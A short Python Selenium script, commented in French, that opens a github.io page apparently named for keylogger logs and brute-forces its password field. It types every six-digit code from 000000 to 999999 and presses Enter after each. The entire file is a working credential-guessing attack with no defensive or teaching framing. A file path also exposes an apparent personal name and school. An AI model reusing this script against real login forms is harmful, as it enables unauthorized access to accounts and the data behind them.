from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
import time

# --- Chemin vers TON Chrome portable ---
chrome_path = r"C:\Users\simon\OneDrive - OGEC LILLE\lucas\chromeeeeeeeeeeeeeeeeeeeeee.exe"  # <-- mets ton vrai chemin ici

options = Options()
options.binary_location = chrome_path

service = Service(ChromeDriverManager().install())
driver = webdriver.Chrome(service=service, options=options)

def generate_codes():
    code = 0
    while True:
        yield f"{code:06d}"
        code += 1

driver.get("https://oscar-quiloulou.github.io/logs-keylogger/")

textbox = driver.find_element(By.ID, "passwordInput")

gen = generate_codes()

for _ in range(999999):
    code = next(gen)
    textbox.clear()
    textbox.send_keys(code)
    textbox.send_keys(Keys.ENTER)
    time.sleep(0.5)

driver.quit()
